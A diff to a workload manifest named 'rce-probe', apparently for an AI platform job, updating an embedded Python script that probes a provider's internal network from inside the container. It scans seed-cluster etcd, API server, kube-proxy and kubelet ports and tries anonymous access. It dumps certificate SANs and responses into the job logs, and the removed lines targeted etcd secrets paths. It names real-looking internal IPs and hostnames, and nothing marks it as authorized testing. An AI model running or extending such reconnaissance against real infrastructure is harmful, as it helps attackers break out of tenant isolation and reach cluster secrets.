@@ -4,10 +4,10 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.13.0"
+    ai.sap.com/version: "4.14.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "etcd-8080-2379-kube-proxy-10249-ctrlplane"
+    executables.ai.sap.com/description: "seed-cluster-8080-metrics-kproxy-full-etcd-grpc"
     executables.ai.sap.com/name: "rce-probe"
 spec:
   template:
@@ -28,17 +28,16 @@ spec:
           args:
           - |
             python3 -c "
-            import os, socket, ssl, struct, json
+            import os, socket, ssl, struct
 
-            print('[PROBE_V413_START]', flush=True)
+            print('[PROBE_V414_START]', flush=True)
 
             def emit(label, data):
                 flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
                 for i in range(0, max(1, len(flat)), 4000):
                     print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)
 
-            def http_get_raw(host, port, path, method='GET', extra_headers='',
-                             body='', timeout=10, use_tls=False):
+            def http_raw(host, port, path, method='GET', headers=None, timeout=8, use_tls=False):
                 try:
                     s = socket.socket(); s.settimeout(timeout)
                     if use_tls:
@@ -46,10 +45,8 @@ spec:
                         ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                         s = ctx.wrap_socket(s, server_hostname=host)
                     s.connect((host, port))
-                    req = (f'{method} {path} HTTP/1.0\r\n'
-                           f'Host: {host}:{port}\r\n'
-                           f'{extra_headers}'
-                           f'\r\n{body}')
+                    hdr_str = ''.join(f'{k}: {v}\r\n' for k,v in (headers or {}).items())
+                    req = f'{method} {path} HTTP/1.0\r\nHost: {host}:{port}\r\n{hdr_str}\r\n'
                     s.sendall(req.encode())
                     resp = b''
                     while True:
@@ -61,86 +58,125 @@ spec:
                 except Exception as ex:
                     return f'ERR:{ex}'
 
-            def tcp_probe(host, port, timeout=4):
-                try:
-                    s = socket.socket(); s.settimeout(timeout)
-                    s.connect((host, port))
-                    s.close()
-                    return 'OPEN'
-                except socket.timeout:
-                    return 'TIMEOUT'
-                except Exception as e:
-                    return f'{type(e).__name__}:{e}'
+            # ── 1. Seed cluster 10.250.0.x:8080 — identify service type ──────────
+            print('[SEED_8080_PROBE_START]', flush=True)
+            seed_ips = ['10.250.0.1','10.250.0.2','10.250.0.3']
+            for sip in seed_ips:
+                for path in ['/metrics', '/health', '/healthz', '/v2/keys/', '/readyz',
+                             '/livez', '/debug/pprof/', '/version']:
+                    r = http_raw(sip, 8080, path, timeout=6)
+                    emit(f'SEED_{sip}_8080_{path.replace(\"/\",\"_\")}', r[:3000])
 
-            # ── 1. Scan 10.250.0.x range for etcd/control plane ──────────────────
-            print('[CTRL_PLANE_SCAN_START]', flush=True)
-            for last_octet in range(1, 20):
-                ip = f'10.250.0.{last_octet}'
-                for port in [2379, 8080, 443, 6443]:
-                    r = tcp_probe(ip, port, timeout=2)
-                    if r == 'OPEN':
-                        emit(f'SCAN_OPEN_{ip}_{port}', r)
+            # ── 2. Seed cluster :2379 — try plain HTTP gRPC (etcd v3) ─────────────
+            # etcd v3 uses gRPC over TLS. Try with TLS but no client cert.
+            print('[SEED_ETCD_PROBE_START]', flush=True)
+            for sip in seed_ips:
+                # Try HTTP/1.1 on 2379 (pre-TLS plaintext, some configs allow)
+                r = http_raw(sip, 2379, '/health', timeout=5)
+                emit(f'ETCD_2379_HTTP_{sip}', r[:500])
 
-            # ── 2. etcd HTTP :8080 (legacy v2 API, may be unauthenticated) ────────
-            print('[ETCD_HTTP_PROBE_START]', flush=True)
-            etcd_http_targets = [
-                ('10.250.0.0', 8080),
-                ('10.250.0.1', 8080),
-                ('10.250.0.2', 8080),
-            ]
-            for host, port in etcd_http_targets:
-                for path in ['/health', '/v2/keys/', '/v2/members', '/metrics',
-                             '/v2/keys/registry/secrets/default/', '/v2/keys/registry/']:
-                    r = http_get_raw(host, port, path, timeout=6)
-                    if not r.startswith('ERR:'):
-                        emit(f'ETCD_HTTP_{host}_{port}_{path.replace(\"/\",\"_\")}', r[:3000])
-
-            # ── 3. etcd HTTPS :2379 — see TLS cert, try without client cert ───────
-            print('[ETCD_GRPC_PROBE_START]', flush=True)
-            for host in ['10.250.0.0', '10.250.0.1', '10.250.0.2']:
+                # Try TLS without client cert, get the server cert SAN
                 try:
                     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                     ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                     s = socket.socket(); s.settimeout(8)
-                    ss = ctx.wrap_socket(s, server_hostname=host)
-                    ss.connect((host, 2379))
-                    # Get server cert info
-                    cert = ss.getpeercert(binary_form=True)
-                    emit(f'ETCD_CERT_{host}', cert.hex()[:400] if cert else 'NO_CERT')
-                    # Try HTTP/1.1 health check
-                    ss.sendall(b'GET /health HTTP/1.0\r\nHost: ' + host.encode() + b'\r\n\r\n')
+                    ss = ctx.wrap_socket(s, server_hostname=sip)
+                    ss.connect((sip, 2379))
+                    cert = ss.getpeercert()
+                    san = cert.get('subjectAltName', [])
+                    subject = cert.get('subject', [])
+                    emit(f'ETCD_CERT_SAN_{sip}', f'SAN={san} SUBJECT={subject}')
+                    # Try plain HTTP on the TLS socket
+                    ss.sendall(b'GET /health HTTP/1.0\r\nHost: ' + sip.encode() + b'\r\n\r\n')
                     resp = b''
                     while True:
                         c = ss.recv(4096)
                         if not c: break
                         resp += c
                     ss.close()
-                    emit(f'ETCD_2379_{host}_health', resp[:500].decode(errors='replace'))
+                    emit(f'ETCD_2379_TLS_{sip}', resp[:500].decode(errors='replace'))
                 except Exception as e:
-                    emit(f'ETCD_2379_{host}_ERR', str(e))
+                    emit(f'ETCD_TLS_ERR_{sip}', str(e))
 
-            # ── 4. kube-proxy metrics :10249 on each node ─────────────────────────
-            print('[KUBE_PROXY_PROBE_START]', flush=True)
-            NODE_IPS = ['10.180.1.74', '10.180.12.215', '10.180.13.45', '10.180.35.242']
-            for nip in NODE_IPS:
-                for kpath in ['/metrics', '/healthz', '/configz']:
-                    r = http_get_raw(nip, 10249, kpath, timeout=5)
-                    emit(f'KPROXY_{nip}_{kpath.replace(\"/\",\"_\")}', r[:2000])
+            # ── 3. Seed cluster :6443 — kube-apiserver in seed ────────────────────
+            print('[SEED_6443_PROBE_START]', flush=True)
+            for sip in seed_ips:
+                try:
+                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+                    s = socket.socket(); s.settimeout(8)
+                    ss = ctx.wrap_socket(s, server_hostname=sip)
+                    ss.connect((sip, 6443))
+                    cert = ss.getpeercert()
+                    san = cert.get('subjectAltName', [])
+                    emit(f'SEED_6443_CERT_SAN_{sip}', str(san)[:400])
+                    # Try to hit /version anonymously
+                    ss.sendall(b'GET /version HTTP/1.0\r\nHost: ' + sip.encode() + b'\r\n\r\n')
+                    resp = b''
+                    while True:
+                        c = ss.recv(65536)
+                        if not c: break
+                        resp += c
+                    ss.close()
+                    emit(f'SEED_6443_VERSION_{sip}', resp[:800].decode(errors='replace'))
+                except Exception as e:
+                    emit(f'SEED_6443_ERR_{sip}', str(e))
 
-            # ── 5. K8s API anonymous endpoints (no auth) ──────────────────────────
-            k8s_host = 'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com'
-            for path in ['/version', '/.well-known/openid-configuration',
-                         '/openid/v1/jwks', '/healthz']:
-                r = http_get_raw(k8s_host, 443, path, timeout=8, use_tls=True)
-                emit(f'K8S_{path.replace(\"/\",\"_\")}', r[:1500])
+            # ── 4. Full kube-proxy /configz and metrics (one node, full output) ───
+            print('[KPROXY_FULL_START]', flush=True)
+            NODE = '10.180.1.74'
+            for path in ['/configz', '/metrics']:
+                r = http_raw(NODE, 10249, path, timeout=10)
+                emit(f'KPROXY_FULL_{path.replace(\"/\",\"_\")}', r)
 
-            # ── 6. Gardener API server / seed cluster endpoints ───────────────────
-            # Gardener uses 10.250.0.0/16 for seed cluster
-            for gpath in ['/version', '/healthz', '/api/v1/namespaces']:
-                r = http_get_raw('10.250.0.1', 443, gpath, timeout=5, use_tls=True)
-                emit(f'GARDENER_{gpath.replace(\"/\",\"_\")}', r[:1000])
+            # ── 5. Kubelet :10250 with SPIFFE cert? — check what TLS cert kubelet uses
+            print('[KUBELET_CERT_START]', flush=True)
+            for nip in ['10.180.1.74', '10.180.12.215']:
+                try:
+                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+                    s = socket.socket(); s.settimeout(6)
+                    ss = ctx.wrap_socket(s, server_hostname=nip)
+                    ss.connect((nip, 10250))
+                    cert = ss.getpeercert()
+                    san = cert.get('subjectAltName', [])
+                    subject = cert.get('subject', [])
+                    emit(f'KUBELET_CERT_{nip}', f'SAN={san} SUBJECT={subject}')
+                    # Try anonymous /pods
+                    ss.sendall(b'GET /pods HTTP/1.0\r\nHost: ' + nip.encode() + b'\r\n\r\n')
+                    resp = b''
+                    while True:
+                        c = ss.recv(4096)
+                        if not c: break
+                        resp += c
+                    ss.close()
+                    emit(f'KUBELET_ANON_{nip}', resp[:500].decode(errors='replace'))
+                except Exception as e:
+                    emit(f'KUBELET_CERT_ERR_{nip}', str(e))
 
-            print('[PROBE_V413_DONE]', flush=True)
+            # ── 6. Seed cluster :443 cert and any anon access ─────────────────────
+            for sip in ['10.250.0.1', '10.250.0.2']:
+                try:
+                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+                    s = socket.socket(); s.settimeout(8)
+                    ss = ctx.wrap_socket(s, server_hostname=sip)
+                    ss.connect((sip, 443))
+                    cert = ss.getpeercert()
+                    san = cert.get('subjectAltName', [])
+                    emit(f'SEED_443_SAN_{sip}', str(san)[:400])
+                    ss.sendall(b'GET /version HTTP/1.0\r\nHost: ' + sip.encode() + b'\r\n\r\n')
+                    resp = b''
+                    while True:
+                        c = ss.recv(65536)
+                        if not c: break
+                        resp += c
+                    ss.close()
+                    emit(f'SEED_443_RESP_{sip}', resp[:800].decode(errors='replace'))
+                except Exception as e:
+                    emit(f'SEED_443_ERR_{sip}', str(e))
+
+            print('[PROBE_V414_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
